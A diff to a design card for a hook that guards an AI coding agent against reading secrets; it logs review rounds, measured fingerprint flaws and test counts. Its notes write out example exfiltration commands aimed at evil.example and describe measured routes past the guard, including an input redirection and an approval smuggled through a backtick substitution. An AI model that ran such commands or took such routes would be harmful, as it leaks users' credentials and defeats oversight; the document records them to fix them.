@@ -1,7 +1,7 @@
 ---
-phase: planning
+phase: implementation
 model_tier: high
-branch: none
+branch: feat/output-secret-redaction
 ---
 
 # Output secret redaction — blank known secret values out of what a command printed
@@ -10,7 +10,7 @@ branch: none
 
 Two real credentials leaked out of `~/.terminal_aliases` into a session transcript on
 2026-08-27. `secret-command-guard.sh` shipped in response, and it works — but it judges
-the **text of a command**, never what came back. Every one of the seven shapes in that
+the **text of a command**, never what came back. Every one of the eight shapes in that
 card's Known-gaps table is the same defect wearing a different hat: put the read inside a
 script file, behind a variable, behind a glob, or in a file not named `.env`, and the
 classifier has nothing to match on. Widening the pattern list cannot close a gap whose
@@ -21,8 +21,13 @@ and can replace it before the model ever reads it. That closes the shapes whose 
 *how the file was reached* — script file, variable, glob, `$(…)` — because output redaction
 does not care about the route. It does **not** close the two whose defect is *which file*:
 `cat foo.zshrc` / `cat my.env` and `cat config/prod.env` name files that are absent from the
-Sources table below, so a known-values design never harvests them either. Five of seven, not
-seven; the Known-gaps table records the remainder.
+Sources table below, so a known-values design never harvests them either. **Six of eight, not
+eight**; the Known-gaps table records the remainder. (That table had seven rows when this was
+written. An eighth was measured on 2026-08-30 — an INPUT REDIRECTION, `cat < ~/.zshrc`, which
+lexes to `argv ['cat']` and is allowed. It is a route defect like the script-file row, so
+output redaction should close it too, which is why the count moved five-of-seven to
+six-of-eight rather than five-of-eight. That reading carries the same caveat as the original,
+recorded under Not verified: it is a reading of the sibling card's table, not a measurement.)
 
 **The premise that said this was impossible is false. It is written in three places, and a
 fourth site rests on a separate objection that is also obsolete.**
@@ -778,7 +783,23 @@ may claim otherwise.
       candidate `0040` came from a snapshot roughly a day stale, `git fetch origin` failed
       with `Permission denied (publickey)` in that environment, and two `0026-*` files already
       coexist on `origin/main`, so collisions here are real rather than hypothetical.
-- [ ] 13. **Secret-gate override, mechanical half.** Amend `hooks/secret-command-guard.sh` (and
+- [x] 13. **Secret-gate override, mechanical half.** *(landed 2026-08-30)*
+      Two limits found in review and closed by REFUSING rather than by parsing, so the
+      guard never prints a route that cannot work. A command is **not approvable** if it
+      contains a redirection (`<`/`>`) -- at the time this landed, because the lexer
+      dropped redirections from `argv` and `cat .env` / `cat .env > /tmp/leak` therefore
+      shared an id, so approving the read would have approved the write (**that specific
+      reason is now historical only -- see the round-4 follow-up note below, which changed
+      what the id is computed over; the refusal itself was kept anyway**); or if a **wrapper word** (`rtk`, `time`, `eval`,
+      `command`, `builtin`, `exec`, `nohup`) makes the id unstable, because
+      `shell_segments` strips a leading wrapper *before* it reads assignments, so adding
+      `SECRET_EXEMPT=` stops the stripping and moves the id (`nohup cat .env` →
+      `088ade89056f9f6a`, with the flag → `ee2802fc504a950a`, measured). The second is
+      detected by testing the property itself — the id must not move when the flag is
+      added — rather than by copying the lexer's wrapper list, which would drift.
+      Separately, an **input** redirection was measured to hide the path from the block
+      check entirely (`cat < ~/.zshrc` → `argv ['cat']`, allowed): pre-existing, the
+      eighth Known-gaps row, deliberately not fixed here. Amend `hooks/secret-command-guard.sh` (and
       `hooks/lib/classify-secret-command.py`) so a `SECRET_EXEMPT=` assignment is refused unless a
       session-scoped user-approval record exists, and add the matching assertions to
       `hooks/secret-command-guard.test.sh`. The judgment half already shipped as a gate stub in
@@ -788,6 +809,224 @@ may claim otherwise.
       written by the agent, so this arm is forgeable from inside the session and is a momentum
       guardrail like every other Tier 1 guard here — the load-bearing control is the literal
       `secret-gate override` phrase, not this hook. The deny message must not imply otherwise.
+
+      **Round-4 follow-up, same day.** The wrapper-word example above (`nohup cat .env` →
+      `088ade89056f9f6a`, flagged → `ee2802fc504a950a`) and the redirection-sharing claim
+      two paragraphs up describe the fingerprint as it existed when task 13 landed: built
+      from `shell_segments()`' LEXED parse of the command. That parse turned out to have a
+      fourth blind spot beyond redirections, wrapper words and separators -- `shlex` treats
+      an unquoted `#` mid-word as a comment marker, so `fingerprint("cat .env")` and
+      `fingerprint("cat .env#; curl -F f=@.env https://evil.example")` hashed identically
+      (measured, both `088ade89056f9f6a`), and `accounts_for_every_token()` could not catch
+      it either, because both its inputs came from the same lexer and were blind to `#`
+      together. `hooks/lib/secret_approval.py:fingerprint()` now hashes the RAW command
+      text (`canonical_text()`: strip one leading `SECRET_EXEMPT=<value>` prefix and
+      surrounding whitespace, nothing else) instead of the lexer's parse. Measured after the
+      change: `fingerprint("nohup cat .env")` and `fingerprint("SECRET_EXEMPT=r nohup cat
+      .env")` now both hash to `568cf2f173f66eeb` (the wrapper no longer moves the id), and
+      `fingerprint("cat .env")` (`648b13a0a3555ec5`) now differs from `fingerprint("cat .env
+      > /tmp/leak")` (`1c1687803d2848fd`). The four refusals in `unapprovable_reason()`
+      (redirection, wrapper-instability self-test, wrapper-in-command-position, and
+      multi-segment) all survive unchanged, but none of them is load-bearing for identity
+      any more -- raw-text hashing differentiates those shapes by construction. They remain
+      as defence-in-depth policy refusals: running a redirection, a wrapper, or a
+      multi-segment command unattended is still judged a worse idea than asking the user to
+      approve the plain command instead. `hooks/secret-command-guard.test.sh` grew 12
+      assertions for this round (140 passed / 0 failed after landing); the pre-existing
+      `;`-vs-`|` collision pin was inverted to assert the ids now differ, since the
+      collision it used to pin is closed by construction rather than by the refusal.
+
+      **Round-6 corrections to the paragraph above and to `a8e1d7d`'s commit body, which
+      cannot be rewritten because it is pushed -- recorded here so the audit trail carries
+      its own correction rather than a silent fix.** Found by the observability judge
+      (round 5, verdict `2026-08-30-feat-output-secret-redaction.round5.md`) and
+      independently re-measured before this note was written:
+
+      1. **Wrong hash.** Both the module docstring and `a8e1d7d`'s commit body stated
+         `fingerprint("cat .env > /tmp/x") = 1c1687803d2848fd`. Measured:
+         `1c1687803d2848fd` is the hash of `cat .env > /tmp/leak`, a different command used
+         elsewhere in the same file. The real hash of `cat .env > /tmp/x` is
+         `d60e853f0bc0a0fc`. Corrected in `hooks/lib/secret_approval.py`'s module docstring.
+      2. **Wrong assertion arithmetic.** The commit body said "11 fingerprint + 1 end-to-end"
+         assertions were added, with "6 of 11" turning red against pre-round-4 `3b7f44c`.
+         Measured: 9 `fp_eq_case`/`fp_ne_case` assertions + 2 end-to-end `run_case_sid`
+         assertions + 1 Known-gaps ALLOW row = 12 assertions (matches the suite's 128→140
+         growth), and the red count against `3b7f44c` is 6 of 12, not 6 of 11.
+      3. **The instability self-test never fired.** "The four refusals in
+         `unapprovable_reason()` ... all survive unchanged" (above) was true as a list of
+         four checks existing in the source, but one of them --
+         the wrapper-instability self-test -- could never fire: it compared
+         `fingerprint(command)` against `fingerprint(EXEMPT_VAR=x + canonical_text(command))`,
+         and `canonical_text()` always strips exactly the prefix that comparison had just
+         invented, so the two sides were equal by construction. Measured: 0 fires in
+         300,000 fuzz commands, 0 of the 379 command strings the suite exercised at the
+         time, and deleting the check left the suite green (140 passed / 0 failed). It was
+         documented as a live defence-in-depth refusal in three places (this file, the
+         module docstring, and the a8e1d7d commit body) while doing nothing at runtime.
+      4. **Its disclosed mitigation didn't mitigate.** A gap this round shipped
+         unverified -- `SECRET_EXEMPT=a'b' cat .env` and `SECRET_EXEMPT=x"y" cat .env` are
+         valid bash assignments whose value starts unquoted and switches to quoted
+         mid-word, which `_EXEMPT_PREFIX_RE`'s value alternation cannot span. The commit
+         body pointed at the (dead) instability self-test as the runtime mitigation for
+         this exact gap; since that check never fired, the mitigation was false as shipped.
+         The gap itself failed SAFE (the grant became unspendable, not a leak), but the
+         deny message blamed "no recorded approval" rather than naming the real cause.
+      5. **The redirection refusal was shadowed by the backstop.** A mutation
+         scorecard (deleting each check in `unapprovable_reason()` from a scratch copy,
+         one at a time, and re-running the suite) showed deleting the redirection-specific
+         check left the suite at 140 passed / 0 failed -- no assertion discriminated it
+         from `accounts_for_every_token()`'s generic backstop. Root cause: the wrapper
+         script (`hooks/secret-command-guard.sh`) appended a fixed boilerplate line whenever
+         *any* `unapprovable_reason()` check fired -- "seek approval for the plain command
+         without the redirection or wrapper word" -- which contained the literal word
+         "redirect" regardless of which check actually produced the refusal, so a
+         `run_case_*_msg` assertion grepping the hook's full stderr could never tell them
+         apart. The same shadowing applied to the mislabeled test below. `cbee532` reworded
+         that boilerplate line to "change the command to remove what the reason above
+         names", which no longer contains "redirect" -- the shadowing this describes is
+         closed at the message level too, on top of the test's own fix (calling
+         `secret_approval.py id` directly instead of grepping the wrapper's stderr).
+      6. **A mislabeled test.** The assertion named "...and the reason names the
+         instability" (input `time cat .env`) matched only because the BACKSTOP's generic
+         message happens to contain the word "wrapper" -- the instability check had no
+         coverage at all, and `time cat .env` is a wrapper shape, not an instability shape.
+
+      **Round 6 (2026-08-31) fixed all six.** `unapprovable_reason()`'s dead
+      instability check was replaced -- not merely deleted -- with one that asks
+      whether `segments(canonical_text(command))` still finds a `SECRET_EXEMPT`
+      assignment, i.e. whether a second, independent reader (the lexer) agrees the
+      stripping regex actually stripped the flag this command carries. It fires on both
+      disclosed shapes and on neither of the four controls (`SECRET_EXEMPT=plain`, a
+      single-quoted reason, a double-quoted reason, and the unflagged command), verified
+      by direct assertions plus a 75,000-command probe (50,000 ordinary commands, 20,000
+      cleanly-quoted `SECRET_EXEMPT` values, 5,000 unstable-quoting values): 0 false
+      fires, 0 misses. New assertions call `secret_approval.py id` directly rather than
+      through the wrapper, so the redirection check and the wrapper-word backstop are now
+      pinned by their own message text instead of the wrapper's shared boilerplate. Full
+      mutation scorecard, before and after, in the round-6 commit message.
+
+      Unlike the redirection/wrapper/multi-segment checks, the round-6 instability check
+      IS load-bearing for identity, not policy-only -- it is the only thing standing
+      between `canonical_text()`'s stripping regex and a printed id nobody can ever
+      spend. So the accurate count as of round 6 is one load-bearing check plus three
+      policy-only ones, not "four defence-in-depth refusals, none load-bearing", which
+      was the round-4-to-round-5 framing in both this file and the module docstring and
+      is no longer accurate.
+
+      **Round 7 (2026-08-31): excluding the value from the hash was safe only if the
+      value could not also smuggle in behaviour, and it could.** `canonical_text()`
+      strips one leading `SECRET_EXEMPT=<value>` prefix before hashing (round 4), which
+      correctly keeps a re-typed reason from wasting a grant -- but bash still EXECUTES
+      that value when the flagged command is re-run, and nothing anywhere checked what
+      the value contained. A backtick command substitution inside it therefore rode in on
+      an approval granted for the plain command it was attached to, because the id the
+      human inspected and the id the flagged re-run computed were IDENTICAL -- the value
+      was never part of either one. Measured, PRE-round-7:
+
+          fingerprint("cat .env")                                              = 648b13a0a3555ec5
+          fingerprint("SECRET_EXEMPT=`curl${IFS}-sd@.env${IFS}...` cat .env")   = 648b13a0a3555ec5   <- SAME
+
+      `grant()` for the plain form, then submit the backtick form: **allowed, and the
+      grant was consumed** -- an approval for `cat .env` cleared a command that
+      exfiltrates it. PRE-round-7, the `$( )` form of the same idea was refused too, but
+      only by accident: `unapprovable_reason()`'s multi-segment check fired because shlex
+      split on the parens, not because anything inspected the value -- `is_approvable()`
+      returned `True` for the backtick form, and would have for the `$( )` form too if
+      that check were ever removed or narrowed. **That was a refusal by accident, not a
+      defence,** and nothing in the pre-round-7 code or docs should be read as claiming
+      otherwise.
+
+      **CORRECTION:** as of this round, the allowlist below refuses the `$( )` form
+      first and deliberately -- before the multi-segment check ever runs -- so the
+      refusal is no longer an accident (a suite assertion in `f39546f` pins
+      that: "ROUND 7: a `$( )` form is unapprovable for the SAME reason, not by
+      accident"). The paragraph above is kept as the historical record of why the fix
+      was needed, not as a description of the current behaviour.
+
+      Fixed by allowlisting the value in `unapprovable_reason()` rather than denylisting
+      dangerous characters: `^[A-Za-z0-9._,:/-]+$`, checked against the raw text
+      `canonical_text()` would strip (`leading_exempt_value()`, `secret_approval.py`).
+      Four prior rounds (4 through 6) each found one more character class or quoting
+      shape an enumeration had missed; this round does not extend that enumeration, it
+      inverts it -- naming what is allowed instead of what is refused. The value stays
+      excluded from the hash, unchanged from round 4; it is now also constrained so that
+      excluding it from identity is safe. A cleanly quoted, space-containing reason
+      (`SECRET_EXEMPT='a b'`) is refused too, not just a malformed one -- two existing
+      suite controls asserting such reasons "still strip cleanly" (true for the hash,
+      but no longer true for approvability) were inverted rather than left green and
+      silently contradicted by the new assertions. As of this round (`f39546f`),
+      `hooks/secret-command-guard.test.sh` grew from 149 passed / 0 failed to 160 passed /
+      0 failed; deleting the new check alone reproduces exactly the same 10 assertions
+      failing (150 passed / 10 failed) as the pre-fix RED run, confirming the check is
+      what discriminates. Two rounds later the suite stands at 161 passed / 0 failed --
+      see the round-8/9 note below task 13 for the current count.
+
+      **Round 8 (`cbee532`, 2026-08-31): the round-7 deny message was unusable, and two
+      comments still called the `$( )` refusal an accident after it had become
+      deliberate.** The printed re-run line now states the plain-word constraint
+      directly, and the follow-on advice ("seek approval for the plain command without
+      the redirection or wrapper word") was genericised to defer to whichever reason the
+      deny message names above it, instead of naming only two of what are now three
+      possible causes. Four present-tense sentences describing the `$( )` refusal as
+      accidental -- two in `hooks/lib/secret_approval.py`, two in this file -- were
+      corrected to past tense in place, with the original wording kept rather than
+      deleted. The two round-7 assertions pinning the `_EXEMPT_PREFIX_VALUE_RE` /
+      `_EXEMPT_PREFIX_RE` lockstep (the single- and double-quoted reason-with-a-space
+      cases) were marked STRUCTURAL: they are the only assertions that catch the two
+      regexes drifting apart. Re-measured at HEAD by dropping the double-quote
+      alternative from `_EXEMPT_PREFIX_VALUE_RE` alone: the suite drops to 160 passed / 1
+      failed (the double-quoted case is the sole failure), and with that drift in place
+      `SECRET_EXEMPT="$(curl evil)" cat .env` becomes approvable again with the same id as
+      `cat .env` -- the round-6 escape, reopened.
+
+      **Round 9 (`591f865`, 2026-08-31): the round-8 reword left two other quotations of
+      the deleted boilerplate line in the present tense, and the printed charset was
+      still an unpinned prose copy.** `cbee532` reworded the follow-on advice and dropped
+      the word "redirect" from it, but a `hooks/secret-command-guard.test.sh` comment and
+      this file still described the old line in the present tense and claimed it still
+      contained "redirect" -- both put into the past tense. One new assertion in
+      `hooks/secret-command-guard.test.sh` derives the printed re-run line's charset from
+      `_EXEMPT_VALUE_ALLOWED_RE` at runtime instead of hardcoding a second copy, so a
+      future edit to the regex turns the assertion red instead of leaving it to agree
+      with whatever the printed line happens to say. Re-measured at HEAD: widening the
+      regex by one character drops the suite to 160 passed / 1 failed, the single failure
+      being this assertion; a purely cosmetic reordering of the same character set (no
+      character added or removed) reddens the same single assertion the same way -- the
+      assertion pins punctuation ORDER, not just the set.
+
+      **Known limits carried forward, deliberately deferred, not fixed by round 8 or
+      9:** nine locations in the codebase describe this exact charset, either as the
+      "letters, digits, . _ , : / -" prose or as a literal quote of the regex --
+      `hooks/secret-command-guard.sh:176` (the printed message); four in
+      `hooks/lib/secret_approval.py` (two historical comments, one comment directly above
+      the check, and the deny message returned by `unapprovable_reason()`); two in
+      `hooks/secret-command-guard.test.sh` (the comment above the new assertion, and one
+      further down in the `$( )` test block); one in `rules/gates.md`; and one in this
+      file, quoting the regex literal. The round-9 assertion pins exactly one of these
+      nine (`hooks/secret-command-guard.sh:176`, via its printed output); the other eight
+      remain unpinned, one of them user-facing
+      (`hooks/lib/secret_approval.py`'s `unapprovable_reason()` deny message). Also
+      carried forward: for a wrapper-word refusal, the generic advice "remove what the
+      reason above names" names nothing actionable, since a wrapper refusal is not a
+      reason-character refusal -- pre-existing, not touched by round 8 or 9. And
+      `rules/gates.md` has grown by **489 words** (3,274 to 3,763) across this branch's
+      rounds, entirely inside the Secret-command-guard / Secret-gate-override bullet --
+      deferred to the user as its own change, not touched here.
+
+      ⚠️ **Correction, same day, to the round-9 implementer's figure and to the sentence
+      it replaced.** The round-9 implementer reported this growth as "roughly 2,081 words
+      (1,691 to 3,772)" and offered it as a correction to the observability judge's
+      ~491, which it called "off by more than 4x". Re-measured by the main agent: **the
+      judge was right and the correction was wrong.** The implementer took its baseline
+      from **local `main`** (merge-base `fd552e9`, where `rules/gates.md` is 1,690 words),
+      which is stale -- this branch already merged `origin/main` at `92e087c`. Against
+      the deciding ref, `origin/main`, the merge-base is `92e087c` and the file is 3,274
+      words there; HEAD is 3,763. Delta **+489**, matching the judge's ~491 to within
+      tokenizer noise. Measured with `len(git show <ref>:rules/gates.md .split())` for
+      both `main` and `origin/main`, printed side by side so the two baselines could not
+      be confused again. The lesson is the one this repo has recorded before: a "next
+      free number" or a "growth since main" check must be run against the ref that
+      actually decides, never a stale local branch.
 
 ## Decisions taken — user-confirmed 2026-08-28
 
@@ -834,6 +1073,8 @@ may claim otherwise.
   the 30,000-char truncation, the failure-direction matrix, and all filter figures — comes
   from subagent measurement that I have not reproduced.** The filter figures additionally
   come from a corpus the same agent tuned against.
-- The claim that this hook closes five of the sibling card's seven gap shapes is a reading of
+- The claim that this hook closes six of the sibling card's eight gap shapes is a reading of
   that card's table, not a measurement. It should be re-derived against the shapes as they
-  stand when implementation starts.
+  stand when implementation starts. The count was five-of-seven until 2026-08-30, when an
+  eighth row (an input redirection) was measured and added; classifying that one as closed is
+  the same kind of unverified reading as the original five, not a stronger claim.
